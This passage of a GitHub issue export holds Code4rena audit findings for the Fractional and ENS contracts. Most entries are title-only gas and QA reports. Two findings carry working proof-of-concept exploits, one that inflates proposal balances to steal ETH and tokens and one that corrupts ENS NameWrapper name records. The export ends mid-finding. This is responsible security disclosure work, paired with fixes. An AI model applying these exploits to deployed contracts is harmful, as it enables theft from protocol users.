can be done, including taking over the Vault's NFTs with an evil module once the proposal goes through.  **NOTE: In the `REJECTION_PERIOD` victims can buy tokens to try to stop the proposal from going through, but the price of every tokens is calculated using the `depositAmount` and `msg.value` (https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L86) both values manipulated by the attacker. **   ## Proof of Concept The proof of concept took 4 hours and 33 mins to be written, as I tried hard to get a clean, and easy to understand and reproduce PoC that illustrates the impact of the attack.  Everything was put inside a function filled with comments at every stage, that can be included within the Unit Tests of the project.  You can read the PoC or include the function in `test/Migration.t.sol` and call `forge test -vvv --match-test testProposalAttack` to execute it.   ```     function testProposalAttack() public {         initializeMigration(alice, bob, TOTAL_SUPPLY, HALF_SUPPLY, true);         (nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();         address[] memory modules = new address[](1);         modules[0] = address(mockModule);          // STEP 0         // The attacker waits until a proposal with over 51% joins and a nice amount of ETH is made          // STEP 1         // Alice makes a legit proposal         alice.migrationModule.propose(             vault,             modules,             nftReceiverPlugins,             nftReceiverSelectors,             TOTAL_SUPPLY * 2,             1 ether         );          // STEP 3         // Alice joins his proposal with 50 ETH and 5,000 tokens out of a total supply of 10,000         alice.migrationModule.join{value: 50 ether}(vault, 1, 5000);          // NOTE: In a real world scenario, several members will join Alice's legit proposal with their own ETH and tokens,         // but to make this PoC easier to read, instead of creating several fake accounts,         // let's have just Alice join his own proposal with 50% of token supply.          // STEP 4         // Bob makes an evil proposal, with evil modules to steal the vault's NFTs         bob.migrationModule.propose(             vault,             modules,             nftReceiverPlugins,             nftReceiverSelectors,             TOTAL_SUPPLY,             1 ether         );          // STEP 5         // Bob joins and then withdraws from the proposal in loop, to inflate the ETH of his proposal         // and total locked tokens (thanks to a bug in the `withdrawContribution` function)         bob.migrationModule.join{value: 10 ether}(vault, 2, 25);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 25);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 25);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 24);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 101);           // Let's do some accounting...         (,,uint256 totalEth_AliceProposal,,,,,,) = migrationModule.migrationInfo(vault,1);         (,,uint256 totalEth_BobProposal,uint256 _totalFractions,,,,,) = migrationModule.migrationInfo(vault,2);          // Alice proposal has 50 ETH.         assertEq(totalEth_AliceProposal, 50000000000000000000);          // Bob's proposal has 50 ETH.         assertEq(totalEth_BobProposal, 50000000000000000000);          // He only put 10 ETH, but it shows 50 ETH because         // we inflate it by exploiting the bug.          // We can keep inflating it indefinitely to get any ETH         // amount desired (up to the max ETH balance of the smart contract).          // NOTE that the very REAL ETH Balance of the vault is only the 50 ETH (from Alice) + 10 ETH (from Bob) = 60 ETH.          // We'll steal those 50 ETH from alice and all of his fractional tokens, to add them to our proposal now.          // STEP 6         // Bob calls commit to kickoff the buyout process         bool started = bob.migrationModule.commit(vault, 2);         assertTrue(started);          // Final accounting:         // Buyout now has 5,100 Fraction tokens from a total supply of 10,000 (that's 51% of total supply,         // exactly what is required to win a proposal)         assertEq(getFractionBalance(buyout), 5101);          // and 50 ETH from Alice's proposal         assertEq(getETHBalance(buyout), 50 ether);          // Bob started with 100 ether and at this time it has 90 ether, as we only spent 10 ether         assertEq(getETHBalance(bob.addr), 90 ether);          // Bob only sent 101 tokens from his own fraction balance to his evil proposal, the rest were stolen         // from Alice's proposal         assertEq(getFractionBalance(bob.addr), 4899);          // Next steps are straight forward, you can get creative and do many things that would make the PoC         // unnecessarily long          // Alice's proposal will revert if she tries to commit it, as only 1 proposal can be LIVE         // at the same time. Also, there's not enough ETH in the contract to commit his proposal,         // We are using all of his ETH in our own proposal.  ```  ## Tools Used Run `forge test -vvv --match-test testProposalAttack` after preparing the testing environment as explained in https://github.com/code-423n4/2022-07-fractional#prepare-environment   ## Recommended Mitigation Steps Update the `proposal.totalEth` and `proposal.totalFractions` in the `withdrawContribution` function.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/26", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/22", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/21", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/1", "labels": [], "target": "2022-07-fractional-findings", "body": "Agreements & Disclosures"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/318", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/317", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/316", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/315", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/313", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Insufficient Validation For ERC721 Receive Hook Based Name Wrapping", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/312", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-ens-findings", "body": "Insufficient Validation For ERC721 Receive Hook Based Name Wrapping"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/311", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/309", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/308", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/307", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/306", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/305", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/304", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/303", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/301", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/300", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/299", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/298", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/297", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/296", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/295", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/291", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/290", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/289", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/288", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/286", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/284", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/273", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/272", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/271", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/270", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/265", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/264", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/261", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/260", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/259", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/258", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/254", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/252", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/251", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/250", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/249", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/248", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/247", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/246", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/245", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/244", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/242", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/239", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/238", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/237", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/235", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/233", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/231", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/228", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/225", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/221", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/220", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "Trust Anchors cannot be added/removed inactivated post deployment", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/219", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "dnssec"], "target": "2022-07-ens-findings", "body": "Trust Anchors cannot be added/removed inactivated post deployment"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/213", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/212", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/205", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "No checks in constructors", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/199", "labels": ["bug", "disagree with severity", "G (Gas Optimization)", "sponsor acknowledged", "old-submission-method"], "target": "2022-07-ens-findings", "body": "No checks in constructors"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/198", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "[PNM-003] The preimage DB (i.e., `NameWrapper.names`) can be maliciously manipulated/corrupted", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/197", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-07-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L520   # Vulnerability details  ### Description  By design, the `NameWrapper.names` is used as a preimage DB so that the client can query the domain name by providing the token ID. The name should be correctly stored. To do so, the `NameWrapper` record the domain's name every time it gets wrapped. And as long as all the parent nodes are recorded in the DB, wrapping a child node will be very efficient by simply querying the parent node's name.  However, within a malicious scenario, it is possible that a subdomain can be wrapped without recording its info in the preimage DB.  Specifically, when `NameWrappper.setSubnodeOwner` / `NameWrappper.setSubnodeRecord` on a given subdomain, the following code is used to check whether the subdomain is wrapped or not. The preimage DB is only updated when the subdomain is not wrapped (to save gas I beieve).  ```solidity= function setSubnodeOwner(     bytes32 parentNode,     string calldata label,     address newOwner,     uint32 fuses,     uint64 expiry )     public     onlyTokenOwner(parentNode)     canCallSetSubnodeOwner(parentNode, keccak256(bytes(label)))     returns (bytes32 node) {     bytes32 labelhash = keccak256(bytes(label));     node = _makeNode(parentNode, labelhash);     (, , expiry) = _getDataAndNormaliseExpiry(parentNode, node, expiry);     if (ens.owner(node) != address(this)) {         ens.setSubnodeOwner(parentNode, labelhash, address(this));         _addLabelAndWrap(parentNode, node, label, newOwner, fuses, expiry);     } else {         _transferAndBurnFuses(node, newOwner, fuses, expiry);     } } ```  However, the problem is that `ens.owner(node) != address(this)` is not sufficient to check whether the node is alreay wrapped. The hacker can manipulate this check by simply invoking `EnsRegistry.setSubnodeOwner` to set the owner as the `NameWrapper` contract without wrapping the node.  Consider the following attack scenario.  + the hacker registers a 2LD domain, e.g., `base.eth` + he assigns a subdomain for himself, e.g., `sub1.base.eth`      + the expiry of `sub1.base.eth` should be set as expired shortly      + note that the expiry is for `sub1.base.eth` instead of `base.eth`, so it is safe to make it soonly expired + the hacker waits for expiration and unwraps his `sub1.base.eth` + the hacker invokes `ens.setSubnodeOwner` to set the owner of `sub2.sub1.base.eth` as NameWrapper contract + the hacker re-wraps his `sub1.base.eth` + the hacker invokes `nameWrapper.setSubnodeOwner` for `sub2.sub1.base.eth`      + as such, `names[namehash(sub2.sub1.base.eth)]` becomes empty  + the hacker invokes `nameWrapper.setSubnodeOwner` for `eth.sub2.sub1.base.eth`.      + as such, `names[namehash(eth.sub2.sub1.base.eth)]` becomes `\\x03eth`  It is not rated as a High issue since the forged name is not valid, i.e., without the tailed `\\x00` (note that a valid name should be like `\\x03eth\\x00`). However, the preimage BD can still be corrupted due to this issue.  ### Notes  Discussed with the project member, Jeff Lau.   If there is any issue running the attached PoC code, please contact me via `izhuer#0001` discord.   ### Suggested Fix  When wrapping node `X`, check whether `NameWrapper.names[X]` is empty directly, and update the preimage DB if it is empty.  ### PoC / Attack Scenario  There is a PoC file named `poc3.js`  To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.   #### poc3.js ```javascript= const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const provider = ethers.provider const namehash = n.hash const { evm } = require('../test-utils') const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 3', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('name of a subdomain can be forged', () => {     /*      * Attack scenario:      * 1. the hacker registers a 2LD domain, e.g., base.eth      *      * 2. he assigns a subdomain for himself, e.g., sub1.base.eth      *      + the expiry of sub1.base.eth should be set as expired shortly      *      + note that the expiry is for sub1.base.eth not base.eth, so it is safe to make it soonly expired      *      * 3. the hacker waits for expiration and unwraps his sub1.base.eth      *      * 4. the hacker invokes ens.setSubnodeOwner to set the owner of sub2.sub1.base.eth as NameWrapper contract      *      * 5. the hacker re-wraps his sub1.base.eth      *      * 6. the hacker invokes nameWrapper.setSubnodeOwner for sub2.sub1.base.eth      *      + as such, `names[namehash(sub2.sub1.base.eth)]` becomes empty      *      * 7. the hacker invokes nameWrapper.setSubnodeOwner for eht.sub2.sub1.base.eth.      *      + as such, `names[namehash(eth.sub2.sub1.base.eth)]` becomes \\03eth      */     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'base'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // registers a 2LD domain       await NameWrapper.registerAndWrapETH2LD(         label,         hacker,         86400,         EMPTY_ADDRESS,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         MAX_EXPIRY       )       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(hacker)        // signed a submomain for the hacker, with a soon-expired expiry       const sub1Label = 'sub1'       const sub1LabelHash = labelhash(sub1Label)       const sub1Domain = sub1Label + '.' + label + '.eth'  // sub1.base.eth       const wrappedSub1TokenId = namehash(sub1Domain)       const block = await provider.getBlock(await provider.getBlockNumber())       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         sub1Label,         hacker,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         block.timestamp + 3600 // soonly expired       )       expect(await EnsRegistry.owner(wrappedSub1TokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSub1TokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSub1TokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP)        // the hacker unwraps his wrappedSubTokenId       await evm.advanceTime(7200)       await NameWrapperH.unwrap(wrappedTokenId, sub1LabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSub1TokenId)).to.equal(hacker)        // the hacker setSubnodeOwner, to set the owner of wrappedSub2TokenId as NameWrapper       const sub2Label = 'sub2'       const sub2LabelHash = labelhash(sub2Label)       const sub2Domain = sub2Label + '.' + sub1Domain // sub2.sub1.base.eth       const wrappedSub2TokenId = namehash(sub2Domain)       await EnsRegistryH.setSubnodeOwner(           wrappedSub1TokenId,           sub2LabelHash,           NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedSub2TokenId)).to.equal(           NameWrapper.address       )        // the hacker re-wraps the sub1node       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)       await NameWrapperH.wrap(encodeName(sub1Domain), hacker, EMPTY_ADDRESS)       expect(await NameWrapper.ownerOf(wrappedSub1TokenId)).to.equal(hacker)        // the hackers setSubnodeOwner       // XXX: till now, the hacker gets sub2Domain with no name in Namewrapper       await NameWrapperH.setSubnodeOwner(         wrappedSub1TokenId,         sub2Label,         hacker,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         MAX_EXPIRY       )       expect(await NameWrapper.ownerOf(wrappedSub2TokenId)).to.equal(hacker)       expect(await NameWrapper.names(wrappedSub2TokenId)).to.equal('0x')        // the hacker forge a fake root node       const sub3Label = 'eth'       const sub3LabelHash = labelhash(sub3Label)       const sub3Domain = sub3Label + '.' + sub2Domain // eth.sub2.sub1.base.eth       const wrappedSub3TokenId = namehash(sub3Domain)       await NameWrapperH.setSubnodeOwner(         wrappedSub2TokenId,         sub3Label,         hacker,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         MAX_EXPIRY       )       expect(await NameWrapper.ownerOf(wrappedSub3TokenId)).to.equal(hacker)        // ///////////////////////////       // // Attack successed!       // ///////////////////////////        // XXX: names[wrappedSub3TokenId] becomes `\\x03eth`       expect(await NameWrapper.names(wrappedSub3TokenId)).to.equal('0x03657468') // \\03eth     })   }) }) ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/193", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/192", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/191", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/190", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-ens-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/189", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-ens-findings", "body": "QA Report"}, {"title": "[PNM-002] The expiry of the parent node can be smaller than the one of a child node, violating the guarantee policy", "html_url": "https://github.com/code-423n4/2022-07-ens-findings/issues/187", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L504 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L356   # Vulnerability details  ### Description  By design, the child node's expiry can only be extended up to the parent's current one. Adding these restrictions means that the ENS users only have to look at the name itself's fuses and expiry (without traversing the hierarchy) to understand what guarantees the users have.  When a parent node tries to `setSubnodeOwner` / `setSubnodeRecord`, the following code is used to guarantee that the new expiry can only be extended up to the current one.  ```solidity= function _getDataAndNormaliseExpiry(     bytes32 parentNode,     bytes32 node,     uint64 expiry )     internal     view     returns (         address owner,         uint32 fuses,         uint64     ) {     uint64 oldExpiry;     (owner, fuses, oldExpiry) = getData(uint256(node));     (, , uint64 maxExpiry) = getData(uint256(parentNode));     expiry = _normaliseExpiry(expiry, oldExpiry, maxExpiry);     return (owner, fuses, expiry); } ```  However, the problem shows when   